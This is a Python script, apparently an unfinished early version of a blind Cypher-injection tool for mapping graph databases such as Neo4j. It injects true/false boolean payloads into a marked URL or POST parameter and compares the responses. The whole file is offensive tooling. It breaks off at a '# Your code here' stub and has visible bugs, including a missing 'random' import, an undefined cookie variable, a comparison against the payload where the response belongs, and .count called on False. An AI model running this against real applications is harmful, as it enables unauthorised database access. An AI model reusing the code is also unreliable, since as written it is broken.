#!/usr/bin/env python3.10

import argparse
import urllib.parse
import requests
import sys


def perform_request(target_url, post_data=False, cookie_data={}, connection_timeout=5):
    try:
        if post_data:
            response = requests.post(target_url, data=post_data, cookies=cookie_data, timeout=connection_timeout)
        else:
            response = requests.get(target_url, cookies=cookie_data, timeout=connection_timeout)

        return response.text

    except requests.exceptions.Timeout:
        return False

def cypher_inject(target_url, payload, post_data=False, cookie_data={}, connection_timeout=5):
    # Check if '*' is in target_url
    if '*' in target_url:
        encoded_payload = urllib.parse.quote_plus(payload)
        target_url = target_url.replace('*', encoded_payload)
    else:
        # Check if '*' is in post_data
        if post_data and '*' in post_data:
            encoded_payload = urllib.parse.quote_plus(payload)
            post_data = post_data.replace('*', encoded_payload)
        else:
            print("Error: no '*' found in target URL or post data")
            return None
    
    return perform_request(target_url, post_data, cookie_data, connection_timeout)

def get_injection_type(target_url, payload, post_data, blind_string, connection_timeout):
    
    injection_character = "'" 
    
    # Generate random values for the payload
    number1 = random.randint(0, 10000)
    number2 = random.randint(0, 10000)

    # Prepare the payloads for the two requests
    true_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number1)
    false_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number2)


    # Try to inject the payloads using single quotes in target_url and post_data
    try:
        true_result = cypher_inject(target_url, true_payload, post_data, cookie_data, connection_timeout)
        false_result = cypher_inject(target_url, false_payload, post_data, cookie_data, connection_timeout)
    except:
        print("Unable to perform cypher injection")
        return False

    # Check if the blind string is present in the response to the first request but not in the response to the second request
    if blind_string in true_payload and blind_string not in false_result:
        return injection_character
    else:
        return False

print('\nCypher Mapping Tool by sectroyer v0.1\n')

try:
    parser = argparse.ArgumentParser(description='Tool for mapping cypher databases (for example neo4j)')
    parser.add_argument('-u', '--url', help='Target URL', required=True)
    parser.add_argument('-d', '--data', help='POST data', default=False)
    parser.add_argument('-c', '--cookie', help='Request cookie', default={})
    parser.add_argument('-s', '--string', help='Blind string')
    parser.add_argument('-t', '--timeout', help='Connection timeout', default=5)
    args = parser.parse_args()

    target_url = args.url
    post_data = args.data
    request_cookie = args.cookie
    blind_string = args.string
    connection_timeout = args.timeout

    if "*" not in target_url and (not post_data or "*" not in post_data):
        print("Error: No '*' provided in url or data. Unable to continue...")
        sys.exit(-1)
    if target_url.count('*') > 1 or post_data.count('*') > 1:
        print("More than one '*' provided in url or data. Unable to continue...")
        sys.exit(-1)

except:
    print('')
    sys.exit()

# Your code here
